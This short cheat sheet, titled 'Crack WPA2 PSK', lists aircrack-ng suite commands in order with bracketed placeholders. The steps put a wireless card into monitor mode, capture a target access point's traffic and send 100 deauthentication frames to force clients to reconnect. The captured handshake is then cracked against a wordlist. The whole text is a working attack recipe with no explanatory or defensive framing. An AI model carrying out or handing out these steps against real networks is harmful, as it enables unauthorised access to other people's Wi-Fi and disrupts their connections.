
## Crack WPA2 PSK

iwconfig
airmon-ng start wlan0
airmon-ng check kill
airodump-ng mon0
airodump-ng --bssid [] -c [] --write WPAcrack mon0
aireplay-ng --deauth 100 -a [mac] mon0
aircrack-ng WPAcrack-01.cap -w [wordlist]


#####
